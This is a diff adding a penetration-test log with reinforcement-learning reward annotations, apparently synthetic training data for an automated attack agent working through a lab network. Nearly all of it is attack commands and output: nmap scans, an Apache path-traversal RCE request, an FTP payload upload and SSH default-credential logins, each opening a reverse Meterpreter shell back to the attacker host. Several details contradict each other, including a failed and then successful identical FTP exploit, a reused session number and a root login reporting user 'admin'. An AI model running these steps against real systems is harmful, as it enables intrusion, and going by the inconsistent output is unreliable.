@@ -1,0 +1,319 @@
+================================================================================
+PENETRATION TEST ENGAGEMENT LOG
+Engagement: engagement_02_ftp_pivot
+Description: Expert pivots through FTP on Windows workstation
+Start Time: 2026-03-05 13:45:00 UTC
+Attacker IP: 172.16.5.22
+Target Network: 10.10.0.0/16
+================================================================================
+
+────────────────────────────────────────────────────────────────────────────────
+[Step 1] 2026-03-05 13:46:59 | Action: SubnetScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:46:59 2026 as: nmap -sn 10.10.1.0/24
+# Timestamp: 2026-03-05 13:46:59
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0168s latency).
+MAC Address: D4:1B:CA:BF:78:C5 (VMware)
+
+Nmap done: 256 IP addresses (1 hosts up) scanned in 44.76 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 2] 2026-03-05 13:49:14 | Action: OSScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:49:14 2026 as: nmap -O 10.10.1.10
+# Timestamp: 2026-03-05 13:49:14
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0013s latency).
+Not shown: 994 closed ports
+22/tcp  open  ssh
+80/tcp  open  http
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.4
+OS details: Ubuntu 20.04.3 LTS, kernel 5.4.0-91-generic
+Network Distance: 1 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 38.00 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 3] 2026-03-05 13:52:40 | Action: ServiceScan | Target: dmz-web01 (10.10.1.10)
+[RL] reward=0.0 | cumulative=0.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:52:40 2026 as: nmap -sV -sC 10.10.1.10
+# Timestamp: 2026-03-05 13:52:40
+Nmap scan report for dmz-web01 (10.10.1.10)
+Host is up (0.0144s latency).
+Not shown: 996 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
+80/tcp    open   http          Apache httpd 2.4.49 ((Ubuntu))
+| ssh-hostkey:
+|   3072 46:13:92:f1:47:f0:e5:02:28:09:83:6e:4c:d8:38:93 (RSA)
+|   256 79:9a:3e:18:7a:d6:ea:20:38:ff:08:7b:49:95:db:00 (ECDSA)
+|_http-server-header: Apache httpd 2.4.49 ((Ubuntu))
+|_http-title: Welcome
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 4] 2026-03-05 13:55:06 | Action: HTTP-EXP | Target: dmz-web01 (10.10.1.10)
+[RL] reward=8.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/multi/http/apache_path_traversal_rce
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > set RHOSTS 10.10.1.10
+RHOSTS => 10.10.1.10
+msf6 apache_path_traversal_rce(exploit/multi/http/apache_path_traversal_rce) > run
+
+[*] [2026-03-05 13:55:06] Started reverse TCP handler on 172.16.5.22:4446
+[*] [2026-03-05 13:55:06] 10.10.1.10:80 - Sending path traversal request...
+[*] [2026-03-05 13:55:06] 10.10.1.10:80 - GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+[+] [2026-03-05 13:55:06] 10.10.1.10:80 - Path traversal successful, RCE achieved
+[*] [2026-03-05 13:55:06] Sending stage (955168 bytes) to 10.10.1.10
+[*] [2026-03-05 13:55:06] Meterpreter session 6 opened (172.16.5.22:4446 -> 10.10.1.10:61770)
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > sysinfo
+Computer     : dmz-web01
+OS           : Ubuntu 20.04.3 LTS
+────────────────────────────────────────────────────────────────────────────────
+[Step 5] 2026-03-05 13:56:07 | Action: SubnetScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:56:07 2026 as: nmap -sn 10.10.3.0/24
+# Timestamp: 2026-03-05 13:56:07
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0098s latency).
+MAC Address: B8:22:0A:C7:F0:16 (VMware)
+
+Nmap scan report for ws-dev02 (10.10.3.31)
+Host is up (0.0117s latency).
+MAC Address: BF:81:08:B6:22:B0 (VMware)
+
+Nmap scan report for honeypot-trap01 (10.10.3.32)
+Host is up (0.0049s latency).
+MAC Address: 35:AA:44:16:B4:AD (VMware)
+
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0148s latency).
+MAC Address: 59:ED:F5:5D:45:20 (VMware)
+
+Nmap scan report for ws-hr04 (10.10.3.34)
+Host is up (0.0131s latency).
+MAC Address: EA:12:96:67:16:66 (VMware)
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 40.03 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 6] 2026-03-05 13:58:07 | Action: OSScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:58:07 2026 as: nmap -O 10.10.3.30
+# Timestamp: 2026-03-05 13:58:07
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0097s latency).
+Not shown: 995 closed ports
+21/tcp  open  ftp
+3389/tcp  open  ms-wbt-server
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Windows 10 Pro 21H2 (build 10.0.19044)
+Network Distance: 3 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 22.09 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 7] 2026-03-05 13:58:56 | Action: ServiceScan | Target: ws-admin01 (10.10.3.30)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:58:56 2026 as: nmap -sV -sC 10.10.3.30
+# Timestamp: 2026-03-05 13:58:56
+Nmap scan report for ws-admin01 (10.10.3.30)
+Host is up (0.0057s latency).
+Not shown: 994 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open   ftp           Microsoft ftpd
+3389/tcp    open   ms-wbt-server Microsoft Terminal Services
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 39.00 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 8] 2026-03-05 13:59:48 | Action: OSScan | Target: ws-finance03 (10.10.3.33)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 13:59:48 2026 as: nmap -O 10.10.3.33
+# Timestamp: 2026-03-05 13:59:48
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0055s latency).
+Not shown: 996 closed ports
+21/tcp  open  ftp
+445/tcp  open  microsoft-ds
+Device type: general purpose
+Running: Microsoft Windows 10
+OS CPE: cpe:/o:microsoft:windows_10
+OS details: Windows 10 Enterprise 21H2 (build 10.0.19044)
+Network Distance: 2 hops
+
+OS detection performed. Report: https://nmap.org/submit/
+Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 9] 2026-03-05 14:02:10 | Action: ServiceScan | Target: ws-finance03 (10.10.3.33)
+[RL] reward=0.0 | cumulative=8.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 14:02:10 2026 as: nmap -sV -sC 10.10.3.33
+# Timestamp: 2026-03-05 14:02:10
+Nmap scan report for ws-finance03 (10.10.3.33)
+Host is up (0.0162s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE       VERSION
+21/tcp    open   ftp           Microsoft ftpd
+445/tcp    open   microsoft-ds  Windows 10 Pro 21H2
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 10] 2026-03-05 14:03:37 | Action: FTP-EXP | Target: ws-admin01 (10.10.3.30)
+[RL] reward=-1.0 | cumulative=7.0 | done=False | success=False
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/windows/ftp/ms_ftp_auth_bypass
+msf6 ms_ftp_auth_bypass(exploit/windows/ftp/ms_ftp_auth_bypass) > set RHOSTS 10.10.3.30
+RHOSTS => 10.10.3.30
+msf6 ms_ftp_auth_bypass(exploit/windows/ftp/ms_ftp_auth_bypass) > run
+
+[*] [2026-03-05 14:03:37] Started reverse TCP handler on 172.16.5.22:4445
+[*] [2026-03-05 14:03:37] 10.10.3.30:21 - Connecting to FTP service...
+[*] [2026-03-05 14:03:37] 10.10.3.30:21 - Banner: 220 Microsoft FTP Service
+[*] [2026-03-05 14:03:37] 10.10.3.30:21 - Attempting anonymous login...
+[-] [2026-03-05 14:03:37] 10.10.3.30:21 - FTP anonymous login rejected
+[-] [2026-03-05 14:03:37] 10.10.3.30:21 - Exploit aborted: target not vulnerable
+[*] [2026-03-05 14:03:37] Exploit completed, but no session was created.
+────────────────────────────────────────────────────────────────────────────────
+[Step 11] 2026-03-05 14:06:24 | Action: FTP-EXP | Target: ws-admin01 (10.10.3.30)
+[RL] reward=9.0 | cumulative=16.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/windows/ftp/ms_ftp_auth_bypass
+msf6 ms_ftp_auth_bypass(exploit/windows/ftp/ms_ftp_auth_bypass) > set RHOSTS 10.10.3.30
+RHOSTS => 10.10.3.30
+msf6 ms_ftp_auth_bypass(exploit/windows/ftp/ms_ftp_auth_bypass) > run
+
+[*] [2026-03-05 14:06:24] Started reverse TCP handler on 172.16.5.22:4445
+[*] [2026-03-05 14:06:24] 10.10.3.30:21 - Connecting to FTP service...
+[*] [2026-03-05 14:06:24] 10.10.3.30:21 - Banner: 220 Microsoft FTP Service
+[*] [2026-03-05 14:06:24] 10.10.3.30:21 - Attempting anonymous login...
+[+] [2026-03-05 14:06:24] 10.10.3.30:21 - Anonymous login successful
+[*] [2026-03-05 14:06:24] 10.10.3.30:21 - Uploading payload via FTP STOR command...
+[+] [2026-03-05 14:06:24] 10.10.3.30:21 - Payload uploaded and executed
+[*] [2026-03-05 14:06:24] Meterpreter session 12 opened (172.16.5.22:4445 -> 10.10.3.30:57015)
+
+meterpreter > getuid
+Server username: CORPNET\ftpuser
+────────────────────────────────────────────────────────────────────────────────
+[Step 12] 2026-03-05 14:08:12 | Action: ServiceScan | Target: db-primary (10.10.2.20)
+[RL] reward=0.0 | cumulative=16.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 14:08:12 2026 as: nmap -sV -sC 10.10.2.20
+# Timestamp: 2026-03-05 14:08:12
+Nmap scan report for db-primary (10.10.2.20)
+Host is up (0.0133s latency).
+Not shown: 992 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 8.4p1 Debian 5+deb11u1
+3306/tcp    open   mysql         MySQL 5.7.36-0ubuntu0.18.04.1
+| ssh-hostkey:
+|   3072 28:dc:5c:96:a4:34:28:a7:97:9c:e4:da:55:e3:b3:e4 (RSA)
+|   256 15:b4:de:8c:1d:26:cf:ba:51:0f:49:e0:11:40:22:78 (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 35.37 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 13] 2026-03-05 14:10:25 | Action: SSH-EXP | Target: db-primary (10.10.2.20)
+[RL] reward=97.0 | cumulative=113.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.2.20
+RHOSTS => 10.10.2.20
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-03-05 14:10:25] Started reverse TCP handler on 172.16.5.22:4444
+[*] [2026-03-05 14:10:25] 10.10.2.20:22 - Attempting SSH authentication bypass...
+[*] [2026-03-05 14:10:25] 10.10.2.20:22 - Trying credential pair: admin:admin123
+[+] [2026-03-05 14:10:25] 10.10.2.20:22 - SSH session established
+[*] [2026-03-05 14:10:25] Sending stage (928699 bytes) to 10.10.2.20
+[*] [2026-03-05 14:10:25] Meterpreter session 12 opened (172.16.5.22:4444 -> 10.10.2.20:52545)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : db-primary
+OS           : Debian 11 (kernel 5.10.0-20-amd64)
+Architecture : x64
+Meterpreter  : x64/linux
+────────────────────────────────────────────────────────────────────────────────
+[Step 14] 2026-03-05 14:13:39 | Action: ServiceScan | Target: srv-backup01 (10.10.4.40)
+[RL] reward=0.0 | cumulative=113.0 | done=False | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+# Nmap 7.93 scan initiated Thu Mar 05 14:13:39 2026 as: nmap -sV -sC 10.10.4.40
+# Timestamp: 2026-03-05 14:13:39
+Nmap scan report for srv-backup01 (10.10.4.40)
+Host is up (0.0125s latency).
+Not shown: 993 closed ports
+PORT      STATE SERVICE       VERSION
+22/tcp    open   ssh           OpenSSH 7.4 CentOS
+443/tcp    open   https         nginx 1.20.1
+| ssh-hostkey:
+|   3072 bd:be:e3:27:46:bb:cb:a0:8e:7f:3a:0d:5f:ff:c6:3c (RSA)
+|   256 86:85:e4:6d:92:fb:66:3e:45:25:e7:58:e3:2c:a3:b1 (ECDSA)
+
+Service detection performed.
+Nmap done: 1 IP address (1 host up) scanned in 32.37 seconds
+────────────────────────────────────────────────────────────────────────────────
+[Step 15] 2026-03-05 14:16:39 | Action: SSH-EXP | Target: srv-backup01 (10.10.4.40)
+[RL] reward=97.0 | cumulative=210.0 | done=True | success=True
+────────────────────────────────────────────────────────────────────────────────
+
+msf6 > use exploit/linux/ssh/openssh_authbypass
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > set RHOSTS 10.10.4.40
+RHOSTS => 10.10.4.40
+msf6 openssh_authbypass(exploit/linux/ssh/openssh_authbypass) > run
+
+[*] [2026-03-05 14:16:39] Started reverse TCP handler on 172.16.5.22:4444
+[*] [2026-03-05 14:16:39] 10.10.4.40:22 - Attempting SSH authentication bypass...
+[*] [2026-03-05 14:16:39] 10.10.4.40:22 - Trying credential pair: root:toor
+[+] [2026-03-05 14:16:39] 10.10.4.40:22 - SSH session established
+[*] [2026-03-05 14:16:39] Sending stage (858631 bytes) to 10.10.4.40
+[*] [2026-03-05 14:16:39] Meterpreter session 18 opened (172.16.5.22:4444 -> 10.10.4.40:49514)
+
+meterpreter > getuid
+Server username: admin
+meterpreter > sysinfo
+Computer     : srv-backup01
+OS           : CentOS 7.9 (kernel 3.10.0-1160.el7)
+Architecture : x64
+Meterpreter  : x64/linux
+
+================================================================================
+ENGAGEMENT COMPLETE: 2026-03-05 14:16:39 UTC
+Total Steps: 15
+================================================================================
+Total Reward: 210
+Goal Reached: True
